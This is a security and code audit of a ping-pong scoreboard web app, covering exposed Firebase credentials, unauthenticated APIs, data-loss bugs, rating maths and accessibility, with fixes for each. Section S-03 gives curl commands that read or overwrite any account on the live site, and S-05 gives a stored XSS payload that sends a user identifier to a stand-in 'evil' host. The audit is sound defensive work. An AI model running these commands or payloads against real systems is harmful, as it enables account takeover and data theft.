# Ping Pong Pi — Code Audit

> **Most of this has since been fixed.** See [FIXES.md](FIXES.md) for the status of
> every finding — 42 of 49 fixed, 7 partial. This document is kept as written, as
> the record of what was found and why it mattered.
>
> Two things still need a human: rotating the exposed Firebase key (S-01) and
> purging both secrets from git history (S-01, S-02).

Audited commit `5653345` ("fixed admin controls bug") on branch `Webapp`.
Scope: all 70 tracked files. Build, test suite, dependency audit and the rating
math were executed, not just read.

**Nothing in this audit has been fixed.** It is a report.

## Verdict

The app builds clean and the UI is genuinely nice. Underneath, three things need
attention in this order:

1. **A live secret is published on the internet.** Your Firebase Admin private key
   is in the public GitHub repo (S-01). A database dump containing plaintext
   passwords is also served from your own website (S-02). S-01 is the one that
   cannot wait.
2. **Cloud saves have been going to the wrong Firestore document since the last
   commit** (D-01). Anyone playing in Google mode is losing every match they record.
3. **The backend has no authentication at all** (S-03). Any visitor can read or
   overwrite any account, including admin passwords.

Everything after that is ordinary technical debt, and there is a lot of it —
but it is the survivable kind.

---

## Severity key

| | Meaning |
|---|---|
| 🔴 **Critical** | Live exposure or silent data destruction. Fix now. |
| 🟠 **High** | Core feature is broken or a documented setting does nothing. |
| 🟡 **Medium** | Wrong behaviour users will hit, but with a workaround. |
| ⚪ **Low** | Debt, dead code, polish. |

---

# S — Security & exposure

### 🔴 S-01 — Firebase Admin private key is committed and public

`.env` is tracked in git and present at the tip of `origin/Webapp`, which is the
public repo `github.com/adamnelsonarcher/Ping-Pong-Pi`. It contains
`FIREBASE_PRIVATE_KEY`, `FIREBASE_CLIENT_EMAIL` and `FIREBASE_PROJECT_ID` — a
**service-account credential with full administrative access to the Firestore
project**, bypassing every security rule.

`.gitignore` *does* list `.env` (line 17), but the file was committed in `44b3731`
before that rule existed, so git keeps tracking it. Ignoring a file never untracks it.

It has been on the public remote since `44b3731`, and was updated as recently as
`6dde800`.

**Blast radius:** read, modify or delete every user's data; run up billing; use the
project as a launch point against anything else in the same GCP project.

**Fix — in this order, today:**
1. Revoke the key: Firebase Console → Project Settings → Service Accounts → delete
   that key, then generate a new one.
2. Put the new value **only** in Vercel project env vars and a local, untracked
   `.env.local`.
3. Untrack the file: `git rm --cached .env`, commit, push.
4. Purge history — `git filter-repo --path .env --invert-paths` (or BFG), then
   force-push. Step 1 matters more than step 4: assume anything that was public has
   been scraped. Do not skip the revoke.

---

### 🟠 S-02 — A production database dump is published on your website

> **Corrected after first publication.** This finding originally described
> `donutcraft34@gmail.com` as a third party's address and was rated 🔴 Critical on
> that basis. It is in fact the repo owner's own git commit email, already present
> in every commit here. No third party's data is involved and there is nothing to
> disclose. Downgraded to 🟠 High: the plaintext passwords are still published.

`public/data/data.json` (424 lines) is a real export of the Firestore document. It
contains:

- `donutcraft34@gmail.com` — the owner's own address, already public in this repo
- an `ADMIN_PASSWORD` of `"1234"`, and another account's `"admin"`
- seven player records with plaintext passwords (`"123"`, …)
- a `"null"` user key — the fingerprint of the boot race in D-07

Because it lives in `public/`, CRA copies it verbatim into `build/data/data.json`
(verified), so it is fetchable at `https://pingpongpi.com/data/data.json` by anyone,
no login. It is also in the public git repo.

Nothing reads this file — it is a leftover from the pre-Firestore prototype.

**Fix:** `git rm public/data/data.json`, purge it from history alongside `.env`, and
change any of those passwords that are reused anywhere else. If they were only ever
throwaway values for this app, there is nothing further to do.

---

### 🔴 S-03 — The API has no authentication whatsoever

`api/getData.js` and `api/saveData.js` never check who is calling.

```bash
# Read anyone's account — including ADMIN_PASSWORD and every player password
curl 'https://pingpongpi.com/api/getData?userId=victim@example.com'

# Overwrite anyone's account
curl -X POST https://pingpongpi.com/api/saveData \
  -H 'Content-Type: application/json' \
  -d '{"currentUser":"victim@example.com","settings":{},"players":{},"gameHistory":[]}'
```

Firebase Auth runs entirely client-side (`LoginScreen.js`). The resulting ID token
is never sent to the server and never verified. The Google login is a UI gate on an
open door. Email addresses are the only identifier, and they are guessable.

**Fix:** send the Firebase ID token as `Authorization: Bearer <token>`, verify it
server-side with `admin.auth().verifyIdToken()`, and derive the document key from
the verified `uid` — never from a client-supplied field. Sketch in
[ROADMAP.md §2](ROADMAP.md).

---

### 🟠 S-04 — CORS allows every origin, with credentials

`api/index.js:8-11` — `origin: '*'` with `credentials: true`. Any website a user
visits can call your API from their browser. (Combined with S-03 there is nothing
extra to steal, but this must be tightened as part of the S-03 fix.) The
`origin: '*'` + `credentials: true` combination is also rejected by browsers, so
it isn't even doing what it looks like it does.

---

### 🟠 S-05 — Stored XSS in the game history

`GameHistory.js:98` renders a hand-built HTML string through
`dangerouslySetInnerHTML`, and player names are interpolated into it raw
(`GameHistory.js:22, 30, 37, 43, 61`).

A player named `<img src=x onerror="fetch('//evil/'+localStorage.currentUser)">`
executes on every viewer's screen. `addPlayer` applies no validation, and via S-03
an attacker can inject the name into *someone else's* account remotely.

**Fix:** drop `dangerouslySetInnerHTML` and return JSX. The function already builds
structured data — `{winner}`, `{loser}`, `{scores}` — so it's a mechanical rewrite
that also lets you delete `.game-result`/`.score-change` string plumbing.

---

### 🟠 S-06 — Passwords are plaintext, and checked in the browser

- `App.js:167` — `values.password === dataService.players[playerName].password`
- `App.js:190` — the same for `ADMIN_PASSWORD`

Both comparisons happen client-side against values the client already downloaded.
Anyone can open DevTools and read `dataService.settings.ADMIN_PASSWORD`, or skip
the check entirely. They are also stored unhashed in Firestore and in localStorage.

This is arguably *acceptable* for player passwords — they're a "don't misclick your
teammate's name" speed bump on a shared TV, not a security control. It is **not**
acceptable for `ADMIN_PASSWORD`, which gates account deletion.

**Fix:** be explicit about the threat model. Rename the player field to `pin` and
document that it's anti-misclick only. Move admin auth server-side, or drop the
separate admin password and gate the panel on "is this the Google account that owns
this data" — which is free once S-03 is fixed.

---

### 🟡 S-07 — `btoa`/`atob` is treated as protection

Commit `7378d8d` "encoded emails in local storage" applies base64 to the stored
email (`dataService.js:439`, `App.js:20`). Base64 is not encryption, not hashing and
not obfuscation — `atob()` in any console reverses it instantly. It provides zero
security, and it caused two real bugs (D-01 and D-06).

---

### 🟡 S-08 — The server logs entire save payloads

`api/saveData.js:6` — `console.log('Received save request:', req.body)`. Every
player password and the admin password are written to Vercel's log retention on
every save.

---

### 🟡 S-09 — 71 dependency vulnerabilities; toolchain unmaintained

`npm audit` reports **71 vulnerabilities (5 critical, 29 high)**. `react-scripts`
5.0.1 pins an old webpack/babel tree and CRA itself was retired in Feb 2025 — the
build prints its own "not maintained anymore" warning. Most of these are dev-only
(webpack-dev-server, postcss), so this is not an emergency, but it is a dead end.
Migration options in [ROADMAP.md §5](ROADMAP.md).

---

# D — Data loss & persistence

### 🔴 D-01 — Cloud saves write to a different Firestore key than reads

This is the most damaging bug in the codebase, and it is **new** — introduced by
the most recent-but-one commit, `7378d8d`.

| Operation | Key sent | Server transform | Resulting document |
|---|---|---|---|
| `loadData` (`dataService.js:152`) | `you@gmail.com` | `.` → `_DOT_` | `you@gmail_DOT_com` |
| `saveData` (`dataService.js:191`) | `btoa(...)` = `eW91QGdt…` | no-op (no dots in base64) | `eW91QGdtYWlsLmNvbQ==` |
| `createUser` (`dataService.js:473`) | `you@gmail.com` | `.` → `_DOT_` | `you@gmail_DOT_com` |
| Admin JSON upload (`AdminControls.js:281`) | `you@gmail.com` | `.` → `_DOT_` | `you@gmail_DOT_com` |

Verified:

```
getData  key : adamnelsonarcher@gmail_DOT_com
saveData key : YWRhbW5lbHNvbmFyY2hlckBnbWFpbC5jb20=
```

**Every game recorded in Google mode is written to an orphan document that is never
read back.** The UI looks correct because React state was updated in memory; on the
next reload, all of it is gone. Restoring a JSON backup appears to work (it uses the
read key), which makes the bug look intermittent.

Firestore is also now accumulating one junk document per user, forever.

**Fix:** one line — revert `dataService.js:191` to `currentUser: this.currentUser`.
Then pick **one** key encoding and apply it in exactly one place: the server. Any
already-orphaned base64 documents will need a manual merge in the Firestore console.

---

### 🟠 D-02 — One-second window where a finished game can vanish

`debouncedSave()` (`dataService.js:116-123`) defers the write by `SAVE_DELAY = 1000`.
There is no `beforeunload` flush and no retry. If the TV is switched off, the tab is
closed, or the network blips within that second, the match is lost with no error.

`endGame` (`dataService.js:631`) does `await dataService.debouncedSave()` — but
`debouncedSave` is not `async` and returns `undefined`, so the `await` is a no-op
and the caller only *appears* to wait for a save. It also fires a second time after
`recordGame` already scheduled one, restarting the timer.

**Fix:** make `debouncedSave` return a promise resolving when the write lands; add
`window.addEventListener('beforeunload', () => dataService.flush())`; queue failed
writes to localStorage and retry on next load.

---

### 🟠 D-03 — Every write is a full-document last-write-wins overwrite

`saveData` ships `settings` + `players` + `gameHistory` in full, and the server
replaces the user's entire subtree (`api/saveData.js:18-27`). The `{ merge: true }`
only merges at the top level — the user's object is replaced wholesale.

Two browsers on the same account (the TV plus a phone, say) will silently destroy
each other's matches. Deleting a player is likewise all-or-nothing.

This is the structural cause behind `6fdcc81 "fixed critical data wipe bug"`,
`37b87f9 "fixed duplicate game history bug"` and `b4324a1 "fixed player save data
bug"` — those commits treated symptoms.

**Fix:** move to per-entity documents and append-only matches. See
[ROADMAP.md §3](ROADMAP.md).

---

### 🟠 D-04 — Re-reading from the server silently discards unsaved edits

`getPlayers()` and `getSettings()` (`dataService.js:577-585`) both call
`loadData()`, which **replaces** `this.players` and `this.settings` on the singleton.

`AdminControls.js:22-35` runs that inside a `useEffect` keyed on `[isDarkMode]`.
So: open Admin, change five settings, toggle dark mode → the effect refires,
`loadData()` overwrites your in-memory edits with the server copy, and
`setGameSettings` resets the whole form. No warning.

The same mechanism means entering Admin within one second of finishing a game
(D-02's debounce window) reloads the pre-game state and throws the match away.

**Fix:** `getSettings`/`getPlayers` should read the already-loaded singleton, not
refetch. Load once at boot; refetch only on explicit user action.

---

### 🟠 D-05 — "Erase Account Data" is broken in cloud mode (and unsafe if patched naively)

`AdminControls.js:207-218`:

```js
const response = await fetch(`${API_URL}/api/getData`);   // no userId!
const data = await response.json();                        // → {settings,players,gameHistory}
delete data.users[dataService.currentUser];                // TypeError: undefined
```

With no `userId`, `getData` returns the empty-account fallback (`getData.js:7-13`),
which has no `.users` — so this throws and the user just sees "Failed to erase
account data."

It fails safe today. But note what it *intends* to do: fetch the **whole database**,
delete one key, and POST the entire thing back. If someone "fixes" it by making
`getData` return the full document, this becomes a one-click wipe of every user on
the platform. The same shape appears in `dataService.saveGameHistory` (D-06's
neighbour, `dataService.js:401-435`).

**Fix:** add a proper `DELETE /api/account` that deletes exactly one authenticated
user's subtree server-side. Never round-trip the database through the browser.

---

### 🟠 D-06 — An interrupted login can permanently white-screen the app

`dataService.js:108-109` runs at **module scope**:

```js
const encodedUser = localStorage.getItem('currentUser');
this.currentUser = encodedUser ? atob(encodedUser) : null;   // unguarded
```

`atob` throws `InvalidCharacterError` on anything that isn't valid base64 — and
both login paths write a **raw** value before anything re-encodes it:

- `LoginScreen.js:105` — `localStorage.setItem('currentUser', email)`
- `LoginScreen.js:132` — `localStorage.setItem('currentUser', 'local_user')`

Normally `App`'s effect calls `dataService.setCurrentUser()` moments later and
rewrites it as base64. But if anything fails in between — `createUser` hits a
network error, the popup is dismissed at the wrong moment, the user closes the tab —
the raw value persists.

On the next load, `atob('you@gmail.com')` throws **while the module is being
imported**, before React renders and outside any error boundary. The result is a
blank page that survives reloads. The only escape is clearing localStorage by hand,
which a non-technical user will not do.

The codebase already contains the fix, unused: `decodeUser()` at
`dataService.js:563-570` wraps `atob` in a try/catch. Neither call site uses it.

**Fix:** route both `App.js:20` and `dataService.js:109` through `decodeUser()`, and
stop base64-ing the email at all (S-07). Add an error boundary regardless (Q-11).

---

### 🟡 D-07 — Boot race writes a `"null"` user document

`SettingsProvider` (`contexts/SettingsContext.js:10-18`) and `App`
(`App.js:36-73`) both call `dataService.loadData()` on mount, against the same
singleton, without coordination. Before login, `dataService.currentUser` is `null`,
so `SettingsProvider` issues `GET /api/getData?userId=null` and then overwrites
`dataService.players` / `.settings` with the empty fallback — potentially after
`App` has just filled them.

The `"null"` key sitting in `public/data/data.json:409` is the artefact of this path
having *written* at some point.

**Fix:** one owner for loading. Have `SettingsProvider` consume state that `App`
loaded, or invert it so the provider owns the data and `App` subscribes. Guard
`loadData` to no-op when `currentUser` is falsy.

---

### 🟡 D-08 — Lowering `GAME_HISTORY_KEEP` permanently deletes matches

`dataService.js:257` — `this.gameHistory = [...this.gameHistory, gameResult].slice(-keep)`.
The truncation is applied to the **stored** array, not just the rendered view. The
admin panel describes it as "Number of games to show in the game history"
(`AdminControls.js:89`), which reads like a display setting. Set it to 5 and 25
matches are gone at the next save.

**Fix:** keep the full history; slice at render time in `GameHistory.js`. If the
document gets large, that's the argument for a `matches` subcollection (ROADMAP §3).

---

# L — Logic & correctness

### 🟠 L-01 — "Quit Game" does nothing, in both storage modes

`quitGame` (`dataService.js:641-657`) calls `saveGameHistory`, which does:

```js
const response = await fetch(`${API_URL}/api/getData`);  // no userId
const data = await response.json();                       // no .users property
if (!data.users[this.currentUser]) { … }                  // TypeError
```

The throw propagates to `quitGame`'s catch, which returns `null`. In
`Scoreboard.js:70-75` and `:120-123`, `onQuitGame` is only called `if (result)` — so
it never fires, and `App.handleQuitGame` never runs. The screen never changes.

There is no local-mode branch in `saveGameHistory` at all, so this fails identically
offline. **A user who starts a game by mistake cannot get back to the main screen
except by reloading the page.**

**Fix:** `quitGame` shouldn't touch the network. Append the quit record to
`dataService.gameHistory` in memory and reuse the normal save path — the same shape
as `recordGame`.

---

### 🟠 L-02 — The rating system is not zero-sum and inflates over time

`recordGame` (`dataService.js:240-241`) updates the winner **first**, then the loser:

```js
const winnerScoreChange = winner.updateScore(loser,  true,  pointDifference, this.settings);
const loserScoreChange  = loser .updateScore(winner, false, pointDifference, this.settings);
```

By the time the loser's expectation is computed, `winner.score` has already moved —
so the two players' calculations use different inputs for the same match.

Verified with a faithful extraction of the scoring code (two equal, active players,
11–9):

```
winner change: +41.0000     loser change: -36.7150
sum:            +4.2850      ← should be 0.0000
```

Reverse the update order and the winner gets `+36.72` instead of `+41.00` for the
identical match. Because the code always updates the winner first, **winners are
systematically over-rewarded and the rating pool inflates by roughly 4 points per
evenly-matched game.** Over a few hundred office matches that is hundreds of points
of drift, and it disproportionately rewards whoever plays most.

`updateActiveStatus()` compounds it: the winner's `active` flag can flip
false→true *inside* their own update, so the loser then sees a ranked opponent and
takes a different `K` branch than the winner did. Same match, two different rulesets:

```
winner change: +49.2000     loser change: -43.0395
```

**Fix:** snapshot both ratings and both `active` flags before either update.

```js
const snap = p => ({ score: p.score, lifetimeScore: p.lifetimeScore, active: p.active });
const w = snap(winner), l = snap(loser);
const winnerChange = winner.updateScore(l, true,  pointDiff, this.settings);
const loserChange  = loser .updateScore(w, false, pointDiff, this.settings);
```

Note this changes everyone's numbers. Do it at the same time as a season reset, and
consider recomputing history from `gameHistory` — you have every match on record.

---

### 🟠 L-03 — Settings changes appear to do nothing until a page reload

`SettingsContext` loads once on mount and never refreshes
(`contexts/SettingsContext.js:10-18`; the `console.log` even says "once"). Nothing
invalidates it when the admin saves.

Consumers reading stale values:

| Setting | Read at | Symptom |
|---|---|---|
| `ADDPLAYER_ADMINONLY` | `App.js:307` | "Add Player" button doesn't move |
| `DISABLE_WIN_ANIMATION` | `Scoreboard.js:43` | **The strobe still plays after being disabled** |
| `DEFAULT_RANK` | `Leaderboard.js:20` | Unranked label doesn't change |

It's worse right after first login: at that point the context holds the values
fetched with `userId=null` (D-07), i.e. pure defaults — so on a fresh login the
user's own settings are ignored entirely, while on a later refresh they work. That
intermittency is why this is hard to spot.

Meanwhile `getLeaderboard` (`dataService.js:297`) reads `DEFAULT_RANK` from the
*singleton*, and `Leaderboard.formatScore` re-applies it from the *context* — two
sources of truth for one value.

**Fix:** make the settings context the single owner and expose an `updateSettings`
that writes through `dataService` **and** setState.

---

### 🟠 L-04 — `ACTIVITY_THRESHOLD` is ignored; the value is hardcoded

`dataService.js:86` declares the parameter with a default:

```js
updateActiveStatus(activityThreshold = 3) {
  this.active = this.gamesPlayed >= activityThreshold;
}
```

The only caller (`dataService.js:64`) passes nothing, so it is always `3`. Verified:
with `ACTIVITY_THRESHOLD = 10`, a player is ranked after 3 games.

The setting is exposed in the admin panel, described in `AdminControls.js:88`,
listed in the README, and stored in Firestore. It has never done anything.

**Fix:** `this.updateActiveStatus(gameSettings.ACTIVITY_THRESHOLD)`. Note that
`getLeaderboard` filters on the cached `active` flag, so raising the threshold won't
demote existing players until they play again — recompute on load.

---

### 🟠 L-05 — The scoreboard colour settings are ignored

`PLAYER1_SCOREBOARD_COLOR` / `PLAYER2_SCOREBOARD_COLOR` exist in defaults
(`dataService.js:98-99`), in local-mode seed data (`LoginScreen.js:142-143`), in
"Reset to Defaults" (`AdminControls.js:163-164`), have descriptions
(`AdminControls.js:92-93`), get colour pickers in the UI, are stored in Firestore,
and are advertised twice in the README.

They are read by **nothing**. The scoreboard hardcodes
`.player-score.green { background-color: #4CAF50 }` and
`.player-score.blue { background-color: #2196F3 }` (`App.css:226-232`), selected by
array index in `Scoreboard.js:179`. `AnimatedScore` even receives an `index` prop it
never uses.

**Fix:** pass the colours as inline style or CSS custom properties from
`Scoreboard`, and delete the `.green`/`.blue` classes.

---

### 🟡 L-06 — Ties are awarded to player 2, and 0–0 games can be recorded

`Scoreboard.js:40` — `player1Score > player2Score ? player1 : player2`. On an exact
tie, player 2 is silently declared the winner and gains rating. `recordGame`
(`dataService.js:235-236`) makes the same assumption.

There is no minimum score and no "did anyone actually win" check, so pressing End
Game at 0–0 records a match, mutates both ratings, and counts toward `gamesPlayed`
(and therefore toward ranked status).

`GameHistory.formatGameResult:41-47` has a tie branch that renders "X and Y tied" —
so the display layer handles a state the data layer refuses to produce correctly.

**Fix:** reject ties and `0-0` in `handleGameEnd` with an on-screen message.
Optionally add a `WIN_BY_TWO` / `TARGET_SCORE` setting; the framework is there.

---

### 🟡 L-07 — A game can be recorded twice during the victory animation

`Scoreboard.handleGameEnd:47-56` calls `endGame(...)` and then waits 3000 ms before
`onGameEnd` switches screens. The `keydown` listener stays attached for that whole
window (`Scoreboard.js:160-165`), so pressing `1` `1` during the animation runs
`endGame` again — a second match row, a second rating change.

Commit `37b87f9 "fixed duplicate game history bug"` addressed a different path; this
one is still open, and `57355aa "updated win animation to play on keypress"` widened
it.

**Fix:** an `isEnding` ref, set before the first `endGame` and checked at the top of
`handleEndGameKey` / `handleEndGameClick`.

---

### 🟡 L-08 — `TIMER_INTERVAL` is documented but was never implemented

Described in the admin panel as "Time in minutes before player selection is cleared"
(`AdminControls.js:85`) and re-added by "Reset to Defaults"
(`AdminControls.js:158`) — but it isn't in `defaultSettings`, and no timer exists
anywhere in the codebase. It survives only in the dead `src/settings1.js:4`, the
Raspberry Pi original.

So "Reset to Defaults" *introduces* a setting that does nothing. Either implement
the auto-clear (it's a genuinely useful feature for a wall-mounted display) or
remove both references.

---

### 🟡 L-09 — `saveSettings()` posts to an endpoint that doesn't exist

`dataService.js:373-389` POSTs to `/api/saveSettings`. The only routes registered
are `/api/getData` and `/api/saveData` (`api/index.js:15-16`). It would 404 — but
nothing calls it. Dead and misleading; the real path is `updateSettings`.

---

### 🟡 L-10 — `resetAllScores` leaves stale streaks and graphs

`dataService.js:360-371` resets `score`, `gamesPlayed`, `wins`, `losses`,
`currentStreak` and `active` — but not `maxWinStreak`, and not `scoreHistory`.
The confirmation says it won't touch lifetime stats
(`AdminControls.js:66`), which is right for `maxWinStreak`; but it also skips
`lifetimeScore` while leaving `scoreHistory` — a *lifetime* series — untouched, so
the two stay consistent. This is nearly correct; the gap is that a reset isn't
recorded anywhere, so the stats graph shows a continuous line across a discontinuity.

**Fix:** push a season-boundary marker into `scoreHistory`, or store seasons
explicitly.

---

### 🟡 L-11 — `editPlayerScore` corrupts the stats graph

`dataService.js:341-349` sets `player.score` (the **season** rating) and then pushes
that value into `scoreHistory` — which everywhere else records `lifetimeScore`
(`dataService.js:62`). An admin score correction injects a point from the wrong
series into the lifetime graph.

It will also throw if `scoreHistory` is missing (see L-12); `updateScore` guards for
that at `dataService.js:59-61`, this method doesn't.

---

### 🟡 L-12 — The stats dialog crashes on players without `scoreHistory`

`LifetimeStatsDialog.js:42` — `player.scoreHistory.map(...)` with no guard, though
`calculateYDomain` two lines later *does* check (`:49`). Double-clicking a player
whose record predates the field (or was restored from an older JSON backup) throws
during render. With no error boundary (Q-11), that takes down the whole app.

**Fix:** `const chartData = (player.scoreHistory ?? []).map(...)`, and normalise the
field in `loadData`'s rehydration loop.

---

### ⚪ L-13 — Adding a duplicate player fails silently

`addPlayer` (`dataService.js:207-218`) returns `false` if the name exists.
`App.handleAddPlayer:123-127` ignores the return value and closes the modal as if it
worked. The user sees no error and no new row.

---

### ⚪ L-14 — `isLocalMode` survives logout

`App.handleLogout:224-228` removes `isLocalMode` **only when not in local mode** —
so logging out *of* local mode leaves `isLocalMode: 'true'` behind. The next Google
login then triggers the "signing in with Google will remove your local save data"
warning, and `dataService`'s constructor starts the next page load believing it's in
local mode until something overrides it.

---

### ⚪ L-15 — Dev API URL points at the wrong port

`src/config/api.js:3` uses `http://localhost:3000` in development, but `server.js`
listens on **3001**. It works by accident: CRA's `proxy` field
(`package.json:51`) forwards unmatched `/api/*` requests from 3000 to 3001. If CRA
starts on a different port (because 3000 is taken) the absolute URL points at the
wrong server and every request fails.

`REACT_APP_API_URL` is defined in `.env.local` and read by nothing.

**Fix:** use a relative `''` base in both environments and let the proxy do its job.

---

# Q — Quality & maintainability

### 🟡 Q-01 — React 18 is running in legacy mode

`src/index.js:7` uses `ReactDOM.render`, removed-in-favour-of `createRoot` since
React 18. This logs a console warning on every boot and **disables concurrent
rendering, automatic batching and `Suspense` improvements** — you're paying React
18's bundle size for React 17's behaviour.

```js
import { createRoot } from 'react-dom/client';
createRoot(document.getElementById('root')).render(<React.StrictMode>…</React.StrictMode>);
```

Note: under `createRoot` + StrictMode, effects double-invoke in development. That
will make D-07's race and the double `loadData` immediately visible — which is a
feature, not a reason to avoid the upgrade.

---

### 🟡 Q-02 — The test suite fails; there is no coverage

`src/App.test.js` is the untouched CRA scaffold looking for a "learn react" link.
Confirmed by running it:

```
Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
```

`npm test` has been red for the life of the project. There are zero tests for the
rating maths, the persistence layer, or the local/cloud switch — the three places
every historical bug has come from. See [ROADMAP.md §6](ROADMAP.md).

---

### 🟡 Q-03 — `package.json` depends on itself

`package.json:16` — `"ping-pong-react": "file:"`. The package lists **itself** as a
dependency, creating a self-referential symlink in `node_modules`. Harmless so far,
but it breaks some installers and confuses tooling. Delete it.

`framer-motion` (`:15`) is installed and imported by nothing. `web-vitals` (`:21`) is
only used by the dead `reportWebVitals.js`. `concurrently` is a dev tool listed under
`dependencies`, as are `express`, `cors` and `dotenv` — server-only packages shipped
in the client's dependency tree.

---

### ⚪ Q-04 — Dead files

Imported by nothing:

| File | Note |
|---|---|
| `src/settings1.js` | Raspberry Pi original; only surviving `TIMER_INTERVAL` |
| `src/components/UserAccount.{js,css}` | Superseded by `InfoButton` |
| `src/context/ThemeContext.js` | Character-identical duplicate of `contexts/` |
| `src/styles/InputModal.css` | Duplicate of `components/InputModal.css` |
| `src/reportWebVitals.js` | Never imported by `index.js` |
| `src/logo.svg` | **0 bytes** |
| `__pycache__/settings.cpython-312.pyc` | Compiled Python, tracked in git |
| `.idea/` | JetBrains config, tracked in git |

The duplicated `ThemeContext` is the dangerous one: importing from `context/`
instead of `contexts/` yields a *different* context object, so `useTheme()` returns
`undefined` and destructuring it throws. It's a live trap for the next edit.

---

### ⚪ Q-05 — Dead code inside `dataService`

`testServerConnection` (`:309`), `testFirestoreConnection` (`:521`), `loginUser`
(`:501`, posts to a non-existent `/api/login`), `saveSettings` (`:373`, L-09),
`saveGameHistory` (`:401`, broken — L-01), `encodeUser`/`decodeUser` (`:559-570`,
never called though `decodeUser` is exactly the fix for D-06). Roughly 150 of 658
lines are unreachable.

---

### ⚪ Q-06 — Dead and conflicting CSS

Rules that match nothing: `.GameHistory .history-container` / `.history-item`
(`App.css:164-182` — the component renders `.game-history-*`), `.Leaderboard
tr.unranked` (`:158`, the component uses `.inactive`), `.admin-page` (`:349`),
`.game-transition-exit` (`:420`), `.game-history-item .underdog`,
`.game-history-item.selected`, `.Leaderboard tr.selected`.

Conflicts: `.btn:hover` is declared identically twice (`App.css:115` and `:388`);
`.btn` sets `transition` twice, the first being dead (`:104`, `:107`); `.score` is
owned by both `App.css:243` and `AnimatedScore.css:1`; `App.css:132-136` puts a
hardcoded `#e0e0e0` bottom border on cells that `Leaderboard.css` themes properly,
so dark mode shows light-grey rules under every row.

---

### ⚪ Q-07 — The declared font is never loaded

`App.css:38` sets `font-family: 'Roboto', sans-serif`, but no `<link>` or `@import`
ever fetches Roboto. Every user falls back to the generic sans-serif, and the two
`preconnect` hints to `fonts.googleapis.com` / `fonts.gstatic.com`
(`index.html:33-34`) open connections that are never used. `index.css:2` separately
sets a system font stack on the same `body` element.

---

### ⚪ Q-08 — The structured-data block is invalid JSON

`public/index.html:110-128` — no comma between the `author` object and
`"screenshot"`. Search engines discard the entire JSON-LD block, so the schema.org
markup does nothing. `sitemap.xml` also still says `lastmod 2024-03-19`.

---

### ⚪ Q-09 — Version drift

`InfoButton.js:23` displays "Version 3.1.0"; `package.json:3` says `0.1.0`. Both are
hand-maintained. The changelog link points at GitHub releases.

---

### ⚪ Q-10 — No error boundary

Any render-time throw — L-12's missing `scoreHistory`, a malformed history entry,
D-06's `atob` — unmounts the entire tree and leaves a white page. On a wall-mounted
TV with no keyboard, that's an outage until someone notices.

---

### ⚪ Q-11 — 215 KB of JavaScript, most of it rarely used

`recharts` is pulled in with a `require()` inside a `try/catch`
(`LifetimeStatsDialog.js:4-9`) — the try/catch does nothing, because bundlers
resolve `require` statically, so the whole charting library ships to every visitor
for a dialog reached by double-clicking a leaderboard row. `firebase/auth` loads on
the login screen and is never needed again.

`React.lazy` on `LifetimeStatsDialog` alone should cut the initial bundle
substantially.

---

### ⚪ Q-12 — Duplicated and unreachable UI code

`App.js:265-274` re-implements the login and loading branches inside the main
`return` — but the early returns at `:75-81` already handled both, so that JSX can
never render. The inline loading markup is also a copy of `LoadingScreen.js`, which
is a copy of the `#initial-loader` markup in `index.html:93-99`. Three copies of one
spinner.

`currentScreen === 'login'` is set in two places and rendered nowhere.

---

### ⚪ Q-13 — Score-decrease animation is a copy of score-increase

`AnimatedScore.css:19-37` — `scoreDecrease` and `scoreIncrease` have identical
keyframes (both scale up to 1.3). Correcting a mis-scored point looks exactly like
scoring one. The `setTimeout(…, 10)` reset trick in `AnimatedScore.js:12-14` is also
fragile; `key`-based remounting or `animation-play-state` is more reliable.

---

# A — Accessibility & user safety

### 🟠 A-01 — Keyboard navigation is completely disabled on player selection

`PlayerSelection.js:38` and `:54` — `onKeyDown={(e) => e.preventDefault()}` on both
`<select>` elements. The comment says "Prevent keyboard input", presumably so the
digit keys used as game controls don't change the dropdown.

It also blocks Enter, Space, arrows, Home/End and type-ahead — i.e. **every**
standard way to operate a select. Keyboard and screen-reader users cannot choose a
player at all. Ironically the game screen is keyboard-only.

**Fix:** filter the specific digit keys rather than blanket-preventing, or don't
attach the game key handler while the main screen is mounted (it currently isn't —
so this may not even be necessary any more).

---

### 🟡 A-02 — Full-screen high-contrast strobe on victory

`VictoryAnimation.css:22-33` alternates the entire viewport between pure white and
pure black eight times over 3.5 s — about 2.3 transitions per second at maximum
contrast, across 100% of the screen.

That is *under* WCAG 2.3.1's three-flashes-per-second threshold, so it is not a
formal violation. But it is close to the line, full-screen, maximum contrast, and
unannounced — a real discomfort risk for photosensitive or migraine-prone viewers in
a shared office.

`DISABLE_WIN_ANIMATION` exists as an escape hatch but is unreliable (L-03), and
there is no `prefers-reduced-motion` handling anywhere in the codebase.

**Fix:** slow the cycle, reduce the contrast (colour wash rather than black/white),
respect `@media (prefers-reduced-motion: reduce)`, and make sure the disable setting
actually takes effect.

---

### ⚪ A-03 — All feedback goes through `alert()` / `confirm()`

23 call sites — 15 in `AdminControls.js`, 5 in `App.js`, 3 in `LoginScreen.js`.
Native dialogs are
unstyleable, block the event loop, are trivially suppressed by browsers, and on a
wall-mounted TV with no mouse they can be genuinely impossible to dismiss. The
project already has `InputModal` and a `.temp-message` toast — both nicer.

---

### ⚪ A-04 — Assorted markup issues

- `.player-controls select { background-color: white }` (`App.css:368`) is not
  theme-aware — white dropdowns in dark mode.
- `.Scoreboard { background-color: #1a1a1a }` (`App.css:203`) is hardcoded, so the
  game screen ignores light theme entirely.
- No `<label>` association in `InputModal` — the label text is used as a
  `placeholder` only (`InputModal.js:40`), which disappears on focus.
- `GameHistory` uses array indices as React keys (`:95`).
- Clickable `<h3>` section headers in `AdminControls` (`:316` etc.) are not buttons
  and have no keyboard handler or `aria-expanded`.

---

## Appendix: findings by file

| File | Findings |
|---|---|
| `.env` | S-01 |
| `public/data/data.json` | S-02 |
| `api/getData.js` | S-03, D-01 |
| `api/saveData.js` | S-03, S-08, D-01, D-03 |
| `api/index.js` | S-04 |
| `src/services/dataService.js` | S-06, S-07, D-01, D-02, D-03, D-04, D-06, D-08, L-01, L-02, L-04, L-09, L-10, L-11, L-13, Q-05 |
| `src/App.js` | S-06, D-06, L-03, L-13, L-14, Q-12 |
| `src/components/Scoreboard.js` | L-03, L-05, L-06, L-07 |
| `src/components/GameHistory.js` | S-05, A-04 |
| `src/components/AdminControls.js` | D-04, D-05, L-08, A-03, A-04 |
| `src/components/LoginScreen.js` | D-06, L-14 |
| `src/components/LifetimeStatsDialog.js` | L-12, Q-11 |
| `src/components/PlayerSelection.js` | A-01 |
| `src/components/VictoryAnimation.css` | A-02 |
